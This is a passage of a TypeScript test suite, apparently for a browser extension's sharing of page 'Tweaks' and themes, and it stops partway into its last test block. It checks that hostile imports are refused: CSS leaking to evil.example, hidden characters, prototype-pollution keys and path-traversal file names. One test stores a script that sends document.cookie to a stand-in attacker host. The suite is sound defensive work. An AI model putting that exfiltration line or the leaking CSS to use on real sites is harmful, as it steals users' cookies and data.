import { describe, expect, it } from 'vitest'
import { NEUTRAL_TINT, type Boost } from './model'
import {
  BOOST_BUNDLE_MAX,
  BOOST_BUNDLE_MAX_BYTES,
  BOOST_CSS_MAX,
  BOOST_JS_MAX,
  BOOST_LINK_MAX,
  BOOST_LINK_PREFIX,
  SHARE_FILE_MAX_BYTES,
  boostFileText,
  boostLink,
  boostsFileText,
  checkSharedBoost,
  describeSharedBoost,
  excerptOf,
  importBundlePreview,
  importPreview,
  invisibleWarnings,
  parseBoostFile,
  parseBoostFiles,
  parseBoostLink,
  parseBoostShareRequest,
  parseShareHost,
  parseShareText,
  parseThemeFile,
  scriptSignals,
  shareFileName,
  shareRefusalMessage,
  shareableBoost,
  shareableBoosts,
  themeFileText,
  type ShareRefusal,
  type ShareRefusalReason,
  type SharedBoost
} from './boost-share'
import { READY_THEMES } from './theme-presets'
import { encodeThemeCode } from './theme-code'
import { setLanguage } from './i18n'
import { frenchSpaces } from './french-typography'

/** Characters that are invisible or change the reading direction, built from their code so that no source line hides them. */
const RTL_OVERRIDE = String.fromCharCode(0x202e)
const ZERO_WIDTH = String.fromCharCode(0x200b)

const BOOST: SharedBoost = {
  name: 'Lecture confortable',
  host: 'example.com',
  css: 'body { max-width: 40em; margin: auto }\np { line-height: 1.6 }',
  js: '',
  zoom: 1.2,
  zap: ['#cookie-banner', 'div.ad:nth-of-type(2) > a.promo'],
  tint: { hue: 20, saturation: 1.1, brightness: 0.95, contrast: 1.05 },
  fontFamily: 'inter',
  textCase: 'capitalize',
  invert: true
}

/** The text of a file whose Tweak is `BOOST` with some fields replaced (an `undefined` removes the field). */
function fileWith(over: Record<string, unknown>, top: Record<string, unknown> = {}): string {
  const boost: Record<string, unknown> = { ...BOOST, ...over }
  for (const key of Object.keys(boost)) if (boost[key] === undefined) delete boost[key]
  return JSON.stringify({ format: 1, kind: 'boost', boost, ...top })
}

const reasonOf = (result: { ok: boolean }): string => ('reason' in result ? String((result as ShareRefusal).reason) : 'ok')
const refusal = (result: { ok: boolean }): ShareRefusal => {
  expect(result.ok).toBe(false)
  return result as ShareRefusal
}

describe('a Tweak file', () => {
  it('is read back as it was written', () => {
    const parsed = parseBoostFile(boostFileText(BOOST))
    expect(parsed).toEqual({ ok: true, boost: BOOST })
  })

  it('is readable JSON that says its format and its kind first', () => {
    const text = boostFileText({ ...BOOST, js: 'document.title = "x"' })
    expect(text.endsWith('}\n')).toBe(true)
    expect(Object.keys(JSON.parse(text))).toEqual(['format', 'kind', 'boost'])
    expect(JSON.parse(text)).toMatchObject({ format: 1, kind: 'boost', boost: { name: 'Lecture confortable', host: 'example.com' } })
  })

  it('fills what a short file leaves out with the neutral values, and names the Tweak after its site', () => {
    const parsed = parseBoostFile(JSON.stringify({ format: 1, kind: 'boost', boost: { host: 'Example.COM' } }))
    expect(parsed).toEqual({ ok: true, boost: { name: 'example.com', host: 'example.com', css: '', js: '', zoom: 1, zap: [], tint: NEUTRAL_TINT } })
  })

  it('carries nothing it does not know: no id, no state, no setting, no extra field of any level', () => {
    const text = fileWith(
      { id: 'steal-this-id', enabled: false, jsEnabled: true, settings: { boostsEnabled: false }, extra: { deep: [1] }, tint: { ...BOOST.tint, evil: 1 } },
      { id: 'top', settings: { boostScriptImport: 'x' }, boosts: [{ host: 'other.example' }] }
    )
    const parsed = parseBoostFile(text)
    expect(parsed).toEqual({ ok: true, boost: BOOST })
    expect(Object.keys((parsed as { boost: object }).boost).sort()).toEqual(['css', 'fontFamily', 'host', 'invert', 'js', 'name', 'textCase', 'tint', 'zap', 'zoom'])
  })

  it('does not let a key of the file reach a prototype', () => {
    const text = '{"format":1,"kind":"boost","__proto__":{"polluted":true},"boost":{"host":"example.com","__proto__":{"polluted":true},"tint":{"__proto__":{"polluted":true}},"constructor":{"prototype":{"polluted":true}}}}'
    const parsed = parseBoostFile(text)
    expect(parsed.ok).toBe(true)
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined()
    expect(Object.getPrototypeOf((parsed as { boost: object }).boost)).toBe(Object.prototype)
    expect(Object.hasOwn((parsed as { boost: { tint: object } }).boost.tint, 'polluted')).toBe(false)
  })

  it('removes an element erased twice', () => {
    const parsed = parseBoostFile(fileWith({ zap: ['#a', '#b', '#a'] }))
    expect(parsed).toMatchObject({ ok: true, boost: { zap: ['#a', '#b'] } })
  })

  it('takes a byte-order mark and a trailing line break in stride', () => {
    expect(parseBoostFile(`${String.fromCharCode(0xfeff)}${boostFileText(BOOST)}\n\n`)).toEqual({ ok: true, boost: BOOST })
  })

  describe('is refused, with the reason, when', () => {
    it.each<[string, unknown, ShareRefusalReason]>([
      ['it is not a text', 42, 'not-json'],
      ['it is empty', '', 'empty'],
      ['it holds only spaces', '  \n\t ', 'empty'],
      ['it is not JSON', 'body { color: red }', 'not-json'],
      ['it is cut short', '{"format":1,"kind":"boost","boost":{"host":"example.', 'not-json'],
      ['it is a JSON list', '[]', 'not-a-share'],
      ['it is a JSON text', '"boost"', 'not-a-share'],
      ['it is JSON null', 'null', 'not-a-share'],
      ['it is an empty object', '{}', 'not-a-share'],
      ['it has no kind', '{"format":1}', 'not-a-share'],
      ['it has no format', '{"kind":"boost","boost":{"host":"example.com"}}', 'not-a-share'],
      ['its kind is unknown', '{"format":1,"kind":"macro"}', 'not-a-share'],
      ['it has no boost', '{"format":1,"kind":"boost"}', 'not-a-share'],
      ['its boost is a list', '{"format":1,"kind":"boost","boost":[]}', 'not-a-share'],
      ['its format is a newer one', '{"format":2,"kind":"boost","boost":{"host":"example.com"}}', 'unknown-format'],
      ['its format is a text', '{"format":"1","kind":"boost","boost":{"host":"example.com"}}', 'unknown-format'],
      ['its format is null', '{"format":null,"kind":"boost","boost":{"host":"example.com"}}', 'unknown-format'],
      ['it is a theme', JSON.stringify({ format: 1, kind: 'theme', code: encodeThemeCode(READY_THEMES[0]!.theme) }), 'wrong-kind']
    ])('%s', (_name, text, reason) => {
      expect(reasonOf(parseBoostFile(text))).toBe(reason)
    })

    it.each<[string, Record<string, unknown>, string]>([
      ['the name is not a text', { name: 5 }, 'name'],
      ['the name is too long', { name: 'x'.repeat(61) }, 'name'],
      ['the CSS is not a text', { css: ['a{}'] }, 'css'],
      ['the CSS is null', { css: null }, 'css'],
      ['the JavaScript is not a text', { js: 1 }, 'js'],
      ['the zoom is a text', { zoom: '1.2' }, 'zoom'],
      ['the zoom is null', { zoom: null }, 'zoom'],
      ['the zoom is below the minimum', { zoom: 0.49 }, 'zoom'],
      ['the zoom is above the maximum', { zoom: 3.01 }, 'zoom'],
      ['the zoom is zero', { zoom: 0 }, 'zoom'],
      ['the zap list is a text', { zap: '#a' }, 'zap'],
      ['the zap list is long', { zap: Array.from({ length: 101 }, (_, i) => `#z${i}`) }, 'zap'],
      ['a zap entry is not a text', { zap: ['#a', 7] }, 'zap'],
      ['the tint is a text', { tint: 'red' }, 'tint'],
      ['the hue is out of range', { tint: { hue: 181 } }, 'tint.hue'],
      ['the saturation is a text', { tint: { saturation: '1' } }, 'tint.saturation'],
      ['the brightness is too low', { tint: { brightness: 0.4 } }, 'tint.brightness'],
      ['the contrast is too high', { tint: { contrast: 1.6 } }, 'tint.contrast'],
      ['the font is not one of the grid', { fontFamily: 'comic-sans' }, 'fontFamily'],
      ['the font is a family stack', { fontFamily: 'Arial, sans-serif' }, 'fontFamily'],
      ['the font is not a text', { fontFamily: 7 }, 'fontFamily'],
      ['the case is unknown', { textCase: 'shout' }, 'textCase'],
      ['the inversion is a text', { invert: 'yes' }, 'invert']
    ])('%s', (_name, over, field) => {
      const result = refusal(parseBoostFile(fileWith(over)))
      expect(result.reason).toBe('invalid-field')
      expect(result.field).toBe(field)
      expect(shareRefusalMessage(result)).toMatch(/\S/)
    })

    it.each(['a{}', '*', '[data-x]', 'a, b', '@import "x"', 'a;b', 'div > > p', 'a > ', '> a', 'DIV', 'a:hover', 'a[href]', 'a b', 'a.b.c.d', 'a >b', '#1a', 'a:nth-of-type(x)', '.only-class', 'a\\:b', '', 'a '.repeat(2), 'x'.repeat(301), 'div > a > p > span > b'])(
      'a zap entry is not what the picker writes: %j',
      (selector) => {
        const result = refusal(parseBoostFile(fileWith({ zap: ['#ok', selector] })))
        expect(result).toMatchObject({ reason: 'invalid-field', field: 'zap', detail: '2' })
        expect(shareRefusalMessage(result)).toContain('n° 2')
      }
    )

    it.each(['#cookie-banner', 'div', 'div.ad', 'div.ad.promo', 'ul > li:nth-of-type(3)', '#main > div.row:nth-of-type(2) > a.btn', 'my-element', 'svg > path:nth-of-type(12)'])('a zap entry the picker writes is kept: %j', (selector) => {
      expect(parseBoostFile(fileWith({ zap: [selector] })).ok).toBe(true)
    })

    it('the CSS or the JavaScript is longer than the limit, and only then', () => {
      expect(reasonOf(parseBoostFile(fileWith({ css: `a{}${' '.repeat(BOOST_CSS_MAX)}` })))).toBe('css-too-large')
      expect(reasonOf(parseBoostFile(fileWith({ css: ' '.repeat(BOOST_CSS_MAX) })))).toBe('ok')
      expect(reasonOf(parseBoostFile(fileWith({ js: ' '.repeat(BOOST_JS_MAX + 1) })))).toBe('js-too-large')
      expect(reasonOf(parseBoostFile(fileWith({ js: ' '.repeat(BOOST_JS_MAX) })))).toBe('ok')
    })

    it('the file is longer than the limit, in bytes and not only in characters, and only then', () => {
      const pad = (n: number) => JSON.stringify({ format: 1, kind: 'boost', boost: { host: 'example.com', name: 'x' }, note: 'x'.repeat(n) })
      const room = SHARE_FILE_MAX_BYTES - pad(0).length
      expect(reasonOf(parseBoostFile(pad(room)))).toBe('ok')
      expect(reasonOf(parseBoostFile(pad(room + 1)))).toBe('too-large')
      // 300 000 characters of two bytes each are 600 000 bytes.
      expect(reasonOf(parseBoostFile(`${pad(0).slice(0, -1)},"note":"${'é'.repeat(300_000)}"}`))).toBe('too-large')
      expect(shareRefusalMessage(refusal(parseBoostFile('x'.repeat(SHARE_FILE_MAX_BYTES + 5))))).toContain(frenchSpaces('512 Ko'))
    })

    it('a hidden character is in the name, the JavaScript or the CSS', () => {
      expect(refusal(parseBoostFile(fileWith({ name: `Sombre${RTL_OVERRIDE}` })))).toMatchObject({ reason: 'hidden-characters', field: 'name' })
      expect(refusal(parseBoostFile(fileWith({ js: `a()\nif (a${RTL_OVERRIDE}) {}` })))).toMatchObject({ reason: 'hidden-characters', field: 'js', line: 2 })
      expect(refusal(parseBoostFile(fileWith({ js: `a()\n\nb(${String.fromCharCode(1)})` })))).toMatchObject({ reason: 'hidden-characters', field: 'js', line: 3 })
      expect(refusal(parseBoostFile(fileWith({ css: `a {\n color: red${String.fromCharCode(0)} }` })))).toMatchObject({ reason: 'hidden-characters', field: 'css', line: 2 })
    })

    it('a line end that is not drawn is in the JavaScript or the CSS: what follows a comment would run unseen', () => {
      for (const code of [0x2028, 0x2029]) {
        const unseen = String.fromCharCode(code)
        expect(refusal(parseBoostFile(fileWith({ js: `a()\n// note${unseen}steal()` }))), code.toString(16)).toMatchObject({ reason: 'hidden-characters', field: 'js', line: 2 })
        expect(refusal(parseBoostFile(fileWith({ css: `a {}\n/* note${unseen} */` }))), code.toString(16)).toMatchObject({ reason: 'hidden-characters', field: 'css', line: 2 })
      }
    })

    it.each([
      ['@import url(https://evil.example/x.css);', 'import'],
      ['a { background: url(https://evil.example/leak) }', 'url'],
      ['a { background: image-set("https://evil.example/a.png" 1x) }', 'image-function'],
      ['a { background: attr(data-bg type(<url>)) }', 'attr-url'],
      ['a { width: expression(alert(1)) }', 'expression'],
      ['a { behavior: url(x.htc) }', 'behavior'],
      ['a { behavior: x }', 'behavior'],
      ['a { -moz-binding: x }', 'binding']
    ])('the CSS is hostile: %j (%s)', (css, rule) => {
      const result = refusal(parseBoostFile(fileWith({ css: `/* honest */\n${css}` })))
      expect(result).toMatchObject({ reason: 'css-forbidden', field: 'css', rule, line: 2 })
      expect(shareRefusalMessage(result)).toContain('(ligne 2)')
    })

    it('the stylesheet in a zap, a name or a font is not where the rules are', () => {
      expect(reasonOf(parseBoostFile(fileWith({ zap: ['#a { background: url(https://evil.example/) } #b'] })))).toBe('invalid-field')
      expect(reasonOf(parseBoostFile(fileWith({ fontFamily: 'x; } @import "y"; a {' })))).toBe('invalid-field')
    })
  })

  it('keeps a script, as text, whatever it says: it is stored switched off, never run here', () => {
    const js = 'fetch("https://evil.example/?c=" + document.cookie)'
    expect(parseBoostFile(fileWith({ js }))).toMatchObject({ ok: true, boost: { js } })
  })

  it('survives text built to be slow or deep', () => {
    const started = Date.now()
    const refused = ['['.repeat(200_000), `${'['.repeat(100_000)}${']'.repeat(100_000)}`, '{"a":'.repeat(50_000), '\u0000'.repeat(1000)]
    for (const text of refused) expect(parseBoostFile(text).ok, text.slice(0, 20)).toBe(false)
    // A stylesheet of 100 000 backslashes is honest as far as the rules go, and is read in no time.
    expect(parseBoostFile('{"format":1,"kind":"boost","boost":{"host":"example.com","css":"' + '\\\\'.repeat(100_000) + '"}}').ok).toBe(true)
    expect(Date.now() - started).toBeLessThan(5000)
  })
})

describe('the site a Tweak targets', () => {
  it.each([
    ['example.com', 'example.com'],
    ['  WWW.Example.COM ', 'example.com'],
    ['a.b.c.example.co.uk', 'a.b.c.example.co.uk'],
    ['my-site.fr', 'my-site.fr'],
    ['xn--bcher-kva.example', 'xn--bcher-kva.example'],
    ['localhost', 'localhost'],
    ['127.0.0.1', '127.0.0.1'],
    ['192.168.0.1', '192.168.0.1'],
    ['255.255.255.255', '255.255.255.255'],
    ['1password.com', '1password.com']
  ])('accepts %j as %j', (text, host) => {
    expect(parseShareHost(text)).toEqual({ ok: true, host })
  })

  it.each([
    ['an address', 'https://example.com'],
    ['an address without a scheme', 'example.com/path'],
    ['a port', 'example.com:8080'],
    ['a query', 'example.com?x=1'],
    ['a space', 'exam ple.com'],
    ['an underscore', 'ex_ample.com'],
    ['a star', '*.example.com'],
    ['a letter with an accent', 'exämple.com'],
    ['nothing', ''],
    ['spaces', '   '],
    ['a bare word', 'com'],
    ['a bare word that is a name', 'intranet'],
    ['the 32 letters of an extension', 'abcdefghijklmnopabcdefghijklmnop'],
    ['an empty label', 'a..example'],
    ['a leading dot', '.example.com'],
    ['a trailing dot', 'example.com.'],
    ['a label starting with a hyphen', '-a.example'],
    ['a label ending with a hyphen', 'a-.example'],
    ['a label of 64 characters', `${'a'.repeat(64)}.example`],
    ['a name of 254 characters', `${'a.'.repeat(126)}com`],
    ['an IPv6 address', '[::1]'],
    ['a short IPv4', '127.1'],
    ['a three-part IPv4', '1.2.3'],
    ['an IPv4 in hexadecimal', '0x7f.0.0.1'],
    ['an IPv4 in octal', '010.1.1.1'],
    ['an IPv4 with a part over 255', '256.1.1.1'],
    ['an IPv4 with five parts', '1.2.3.4.5'],
    ['a host that ends in a number', 'example.123']
  ])('refuses %s', (_name, text) => {
    expect(refusal(parseShareHost(text)).reason).toBe('host-invalid')
  })

  it('refuses what is not a text', () => {
    for (const value of [undefined, null, 5, {}, ['example.com']]) expect(refusal(parseShareHost(value)).reason).toBe('host-invalid')
  })

  it('says what is wrong in a sentence', () => {
    expect(shareRefusalMessage(refusal(parseShareHost('https://example.com')))).toContain('https://example.com')
    expect(shareRefusalMessage(refusal(parseShareHost(undefined)))).toContain('nom de site')
  })
})

describe('a Tweak link', () => {
  const link = (boost: SharedBoost = BOOST) => boostLink(boost)

  it('is a text of safe characters under a fixed prefix, that is not an address', () => {
    const text = link({ ...BOOST, css: 'a::after { content: "é à ç 日本語 😀 / + = ?" }\n'.repeat(20) })
    expect(text.startsWith(BOOST_LINK_PREFIX)).toBe(true)
    expect(text.slice(BOOST_LINK_PREFIX.length)).toMatch(/^[A-Za-z0-9_-]+$/)
    expect(URL.canParse(text)).toBe(false)
  })

  it('is read back as the Tweak it was made from, accents and line breaks included', () => {
    const boost = { ...BOOST, name: 'Édition « sombre »', css: 'a::after { content: "é à ç 日本語 😀" }\n/* ligne */', js: 'console.log("ça marche")' }
    expect(parseBoostLink(link(boost))).toEqual({ ok: true, boost })
  })

  it.each([
    ['spaces around it', (l: string) => `  ${l}  \n`],
    ['double quotes', (l: string) => `"${l}"`],
    ['single quotes', (l: string) => `'${l}'`],
    ['backticks', (l: string) => `\`${l}\``],
    ['angle brackets', (l: string) => `<${l}>`],
    ['line breaks every 60 characters, as a mail client adds them', (l: string) => l.replace(/(.{60})/g, '$1\r\n')]
  ])('is read with %s', (_name, wrap) => {
    expect(parseBoostLink(wrap(link()))).toEqual({ ok: true, boost: BOOST })
  })

  it.each<[string, unknown, ShareRefusalReason]>([
    ['not a text', 5, 'link-not-a-link'],
    ['empty', '  ', 'empty'],
    ['words', 'regarde cette Retouche', 'link-not-a-link'],
    ['an address', 'https://example.com/boost', 'link-not-a-link'],
    ['the code of a theme', encodeThemeCode(READY_THEMES[0]!.theme), 'link-not-a-link'],
    ['a prefix in capitals', link().replace('lucboost', 'LUCBOOST'), 'link-not-a-link'],
    ['another version', `lucboost2_${link().slice(BOOST_LINK_PREFIX.length)}`, 'link-unknown-version'],
    ['no payload', BOOST_LINK_PREFIX, 'link-malformed'],
    ['characters outside base64url', `${BOOST_LINK_PREFIX}${link().slice(10, 40)}+/==`, 'link-malformed'],
    ['standard base64 padding', `${BOOST_LINK_PREFIX}${link().slice(10)}==`, 'link-malformed'],
    ['a payload no base64 can have', `${BOOST_LINK_PREFIX}abcde`, 'link-malformed'],
    ['bytes that are not UTF-8', `${BOOST_LINK_PREFIX}_w`, 'link-malformed'],
    ['base64 of something that is not JSON', `${BOOST_LINK_PREFIX}${btoa('body { color: red }').replace(/=+$/, '')}`, 'not-json'],
    ['the base64 of a theme file', `${BOOST_LINK_PREFIX}${btoa(JSON.stringify({ format: 1, kind: 'theme', code: encodeThemeCode(READY_THEMES[0]!.theme) })).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')}`, 'wrong-kind']
  ])('is refused when it is %s', (_name, text, reason) => {
    expect(reasonOf(parseBoostLink(text))).toBe(reason)
  })

  it('is refused when the file inside it is hostile, with the file reader’s reason', () => {
    const hostile = JSON.stringify({ format: 1, kind: 'boost', boost: { host: 'example.com', css: '@import "https://evil.example/x.css"' } })
    const text = `${BOOST_LINK_PREFIX}${btoa(hostile).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')}`
    expect(refusal(parseBoostLink(text))).toMatchObject({ reason: 'css-forbidden', rule: 'import' })
  })

  it('is refused when it is too long, without being decoded', () => {
    expect(reasonOf(parseBoostLink(`${BOOST_LINK_PREFIX}${'A'.repeat(BOOST_LINK_MAX)}`))).toBe('too-large')
    expect(reasonOf(parseBoostLink(`${BOOST_LINK_PREFIX}${'A'.repeat(BOOST_LINK_MAX * 3)}`))).toBe('too-large')
    // Under the limit of the link but over that of the file once decoded.
    const big = JSON.stringify({ format: 1, kind: 'boost', boost: { host: 'example.com', css: ' '.repeat(40_000) }, note: 'x'.repeat(SHARE_FILE_MAX_BYTES) })
    const bytes = new TextEncoder().encode(big)
    let binary = ''
    for (const byte of bytes) binary += String.fromCharCode(byte)
    expect(reasonOf(parseBoostLink(`${BOOST_LINK_PREFIX}${btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')}`))).toBe('too-large')
  })

  it('carries a very large Tweak whole', () => {
    const boost = { ...BOOST, css: 'a { color: red }\n'.repeat(5000) }
    expect(parseBoostLink(link(boost))).toEqual({ ok: true, boost })
  })
})

describe('sharing a Tweak of the state', () => {
  const stored: Boost = {
    id: 'secret-id',
    name: 'Ma Retouche',
    host: 'example.com',
    enabled: false,
    css: 'p { color: teal }',
    js: 'document.title = "x"',
    jsEnabled: false,
    zoom: 1.1,
    zap: ['#banner'],
    tint: { hue: -30, saturation: 0.9, brightness: 1, contrast: 1 },
    fontFamily: 'fraunces',
    textCase: 'upper',
    invert: true
  }

  it('leaves out the id, the state and the setting of the script, and the script unless it is asked for', () => {
    const without = shareableBoost(stored, false)
    expect(without).toEqual({ ok: true, boost: { name: 'Ma Retouche', host: 'example.com', css: 'p { color: teal }', js: '', zoom: 1.1, zap: ['#banner'], tint: stored.tint, fontFamily: 'fraunces', textCase: 'upper', invert: true } })
    const withScript = shareableBoost(stored, true)
    expect(withScript).toMatchObject({ ok: true, boost: { js: 'document.title = "x"' } })
    expect(JSON.stringify(withScript)).not.toMatch(/secret-id|enabled|jsEnabled/i)
  })

  it('writes a file and a link that read back as the same Tweak', () => {
    for (const withScript of [false, true]) {
      const shared = shareableBoost(stored, withScript)
      if (!shared.ok) throw new Error('not shareable')
      expect(parseBoostFile(boostFileText(shared.boost))).toEqual(shared)
      expect(parseBoostLink(boostLink(shared.boost))).toEqual(shared)
    }
  })

  it('writes what the editor can make: a bare Tweak, a long one, every font and case', () => {
    const bare: Boost = { id: 'b', name: 'b', host: 'example.org', enabled: true, css: '', js: '', zoom: 1, zap: [], tint: NEUTRAL_TINT }
    for (const boost of [bare, { ...bare, css: 'a{}\n'.repeat(900) }, { ...bare, textCase: 'lower' as const }, { ...bare, fontFamily: 'atkinson', zoom: 3 }, { ...bare, zoom: 0.5, tint: { hue: 180, saturation: 2, brightness: 1.5, contrast: 0.5 } }]) {
      const shared = shareableBoost(boost, true)
      if (!shared.ok) throw new Error(`not shareable: ${JSON.stringify(shared)}`)
      expect(parseBoostFile(boostFileText(shared.boost))).toEqual(shared)
    }
  })

  it('does not write what its reader would refuse: the person is told before, not the receiver after', () => {
    expect(refusal(shareableBoost({ ...stored, css: 'body { background: url(https://cdn.example/bg.png) }' }, false))).toMatchObject({ reason: 'css-forbidden', rule: 'url' })
    expect(refusal(shareableBoost({ ...stored, host: 'intranet' }, false)).reason).toBe('host-invalid')
    expect(refusal(shareableBoost({ ...stored, zap: ['a[href]'] }, false)).reason).toBe('invalid-field')
    // A script is only judged when it goes along.
    expect(shareableBoost({ ...stored, js: `x${ZERO_WIDTH}` }, false).ok).toBe(true)
    expect(refusal(shareableBoost({ ...stored, js: `x${RTL_OVERRIDE}` }, true)).reason).toBe('hidden-characters')
  })

  it('names the file after the Tweak', () => {
    expect(shareFileName('Lecture confortable', 'lucium-boost')).toBe('lecture-confortable.lucium-boost')
    expect(shareFileName('  Édition « sombre » 2 ', 'json')).toBe('edition-sombre-2.json')
    expect(shareFileName('../../etc/passwd', 'json')).toBe('etc-passwd.json')
    expect(shareFileName('日本語', 'json')).toBe('sans-nom.json')
    expect(shareFileName('x'.repeat(200), 'json').length).toBeLessThanOrEqual(56)
  })
})

describe('a theme file', () => {
  const theme = READY_THEMES[0]!.theme

  it('is read back as the theme it was made from, with its name', () => {
    const parsed = parseThemeFile(themeFileText(theme, 'Dracula nocturne'))
    expect(parsed).toMatchObject({ ok: true, name: 'Dracula nocturne' })
    expect(encodeThemeCode((parsed as { theme: typeof theme }).theme)).toBe(encodeThemeCode(theme))
  })

  it('holds the code of the theme, so the file reader and the code reader are the same strict one', () => {
    expect(JSON.parse(themeFileText(theme, ''))).toEqual({ format: 1, kind: 'theme', code: encodeThemeCode(theme) })
  })

  it.each<[string, string, ShareRefusalReason]>([
    ['a Tweak', boostFileText(BOOST), 'wrong-kind'],
    ['not JSON', 'luc1_bd93f9', 'not-json'],
    ['a code of another version', JSON.stringify({ format: 1, kind: 'theme', code: 'luc2_bd93f9' }), 'invalid-field'],
    ['a code that is hostile', JSON.stringify({ format: 1, kind: 'theme', code: 'luc1_bd93f9;}body{display:none}_custom_155_85_grain_10_light_vivid_dark' }), 'invalid-field'],
    ['a colour instead of a code', JSON.stringify({ format: 1, kind: 'theme', code: '#bd93f9' }), 'invalid-field'],
    ['no code', JSON.stringify({ format: 1, kind: 'theme' }), 'invalid-field'],
    ['a code that is not a text', JSON.stringify({ format: 1, kind: 'theme', code: 5 }), 'invalid-field'],
    ['a name that is not a text', JSON.stringify({ format: 1, kind: 'theme', name: 5, code: encodeThemeCode(theme) }), 'invalid-field'],
    ['a name that hides characters', JSON.stringify({ format: 1, kind: 'theme', name: `x${RTL_OVERRIDE}`, code: encodeThemeCode(theme) }), 'hidden-characters'],
    ['a name that is too long', JSON.stringify({ format: 1, kind: 'theme', name: 'x'.repeat(61), code: encodeThemeCode(theme) }), 'invalid-field'],
    ['a newer format', JSON.stringify({ format: 3, kind: 'theme', code: encodeThemeCode(theme) }), 'unknown-format'],
    ['a file as big as a Tweak', JSON.stringify({ format: 1, kind: 'theme', code: encodeThemeCode(theme), note: 'x'.repeat(5000) }), 'too-large']
  ])('is refused when it is %s', (_name, text, reason) => {
    expect(reasonOf(parseThemeFile(text))).toBe(reason)
  })

  it('says the limit of a theme file when one is too big, not the limit of a Tweak (it said 512 Ko for 4 Ko)', () => {
    const big = JSON.stringify({ format: 1, kind: 'theme', code: encodeThemeCode(theme), note: 'x'.repeat(5000) })
    expect(refusal(parseThemeFile(big))).toMatchObject({ reason: 'too-large', max: 4096 })
    expect(shareRefusalMessage(refusal(parseThemeFile(big)))).toMatch(/la limite est de 4\u00a0Ko\.$/)
    expect(shareRefusalMessage(refusal(parseBoostFile('x'.repeat(SHARE_FILE_MAX_BYTES + 1))))).toMatch(/la limite est de 512\u00a0Ko\.$/)
  })

  it('shows through the generic reader as a theme, so the shell can tell what a file is', () => {
    expect(parseShareText(themeFileText(theme, 'x'))).toMatchObject({ ok: true, kind: 'theme' })
    expect(parseShareText(boostFileText(BOOST))).toMatchObject({ ok: true, kind: 'boost' })
  })
})

describe('what is said before a Tweak is installed', () => {
  const scripted: SharedBoost = { ...BOOST, js: 'document.title = "x"\nconsole.log(1)' }

  it('lists what the Tweak changes, one thing per line', () => {
    expect(describeSharedBoost(BOOST, 'ask')).toEqual([
      frenchSpaces('Feuille de style : 2 lignes, 61 octets'),
      '2 éléments masqués (Gomme)',
      frenchSpaces('Texte à 120 %'),
      frenchSpaces('Police : Inter'),
      frenchSpaces('Casse : Première Lettre En Majuscule'),
      'Couleurs modifiées (teinte, saturation, luminosité, contraste)',
      'Luminosité inversée (mode sombre)'
    ])
    expect(describeSharedBoost({ ...BOOST, css: '', zap: ['#a'], zoom: 1, fontFamily: undefined, textCase: undefined, tint: NEUTRAL_TINT, invert: undefined }, 'ask')).toEqual(['1 élément masqué (Gomme)'])
    expect(describeSharedBoost({ name: 'x', host: 'example.com', css: '', js: '', zoom: 1, zap: [], tint: NEUTRAL_TINT }, 'ask')).toEqual(['Aucune modification de la page'])
  })

  it('says what becomes of the script, by the setting', () => {
    expect(describeSharedBoost(scripted, 'ask').at(-1)).toBe(frenchSpaces('JavaScript : 2 lignes, 35 octets — désactivé à l’installation'))
    expect(describeSharedBoost(scripted, 'never').at(-1)).toContain('ne sera pas importé')
  })

  it('shows the name, the site, the contents, the start of the CSS and the start of the script', () => {
    const preview = importPreview(scripted, 'ask')
    expect(preview.message).toBe(frenchSpaces('Installer la Retouche « Lecture confortable » ?'))
    expect(preview.detail).toContain(frenchSpaces('Site : example.com (et ses sous-domaines)'))
    expect(preview.detail).toContain(frenchSpaces('• Texte à 120 %'))
    expect(preview.detail).toContain(frenchSpaces('Début du CSS :\n  body { max-width: 40em; margin: auto }'))
    expect(preview.detail).toContain(frenchSpaces('Début du JavaScript :\n  document.title = "x"\n  console.log(1)'))
    expect(preview.detail).toContain('jamais exécuté tant que vous ne l’avez pas lu et activé vous-même')
    expect(preview).toMatchObject({ hasScript: true, scriptDropped: false })
  })

  it('does not show a script that the setting keeps out, and says it is not imported', () => {
    const preview = importPreview(scripted, 'never')
    expect(preview.detail).not.toContain('Début du JavaScript')
    expect(preview.detail).not.toContain('document.title')
    expect(preview).toMatchObject({ hasScript: false, scriptDropped: true })
  })

  it('has no word about a script when there is none', () => {
    const preview = importPreview(BOOST, 'ask')
    expect(preview.detail).not.toMatch(/JavaScript/)
    expect(preview).toMatchObject({ hasScript: false, scriptDropped: false })
  })

  it('stays short whatever the Tweak holds', () => {
    const preview = importPreview({ ...BOOST, css: 'a { color: red } '.repeat(5000).replace(/ \}/g, ' }\n'), js: `${'x'.repeat(5000)}\n`.repeat(500) }, 'ask')
    expect(preview.detail.length).toBeLessThan(3000)
    expect(preview.detail).toContain('lignes de plus')
  })

  it('cuts the long lines of an excerpt and counts the lines left out', () => {
    expect(excerptOf('a\nb')).toBe('  a\n  b')
    expect(excerptOf('x'.repeat(250))).toBe(`  ${'x'.repeat(100)}…`)
    expect(excerptOf(Array.from({ length: 12 }, (_, i) => `l${i}`).join('\n'))).toBe('  l0\n  l1\n  l2\n  l3\n  l4\n  l5\n  l6\n  l7\n  … (4 lignes de plus)')
  })

  it('names in the script what the simple search finds, and nothing it does not', () => {
    expect(scriptSignals('document.title = "x"')).toEqual([])
    expect(scriptSignals('fetch("/a")')).toEqual(['des requêtes réseau (fetch, XMLHttpRequest, WebSocket…)'])
    expect(scriptSignals('new XMLHttpRequest()')).toHaveLength(1)
    expect(scriptSignals('const c = document.cookie; localStorage.setItem("a", c); fetch(u)')).toEqual(['des requêtes réseau (fetch, XMLHttpRequest, WebSocket…)', 'les cookies ou le stockage du site'])
    expect(scriptSignals('eval(code)')).toEqual(['l’évaluation de code ou le chargement d’un autre script'])
    expect(scriptSignals('el.innerHTML = x')).toEqual(['l’ajout d’éléments ou de contenu HTML dans la page'])
    expect(scriptSignals('const password = ""')).toEqual(['des mots qui évoquent un mot de passe ou un jeton'])
    expect(importPreview({ ...BOOST, js: 'fetch(u)' }, 'ask').detail).toContain(frenchSpaces('Le script mentionne : des requêtes réseau'))
    expect(importPreview({ ...BOOST, js: 'document.title = 1' }, 'ask').detail).toContain(frenchSpaces('Cela ne prouve rien : lisez-le.'))
  })
})

describe('a Tweak taken with invisible characters that hide nothing', () => {
  const SOFT_HYPHEN = String.fromCharCode(0xad)
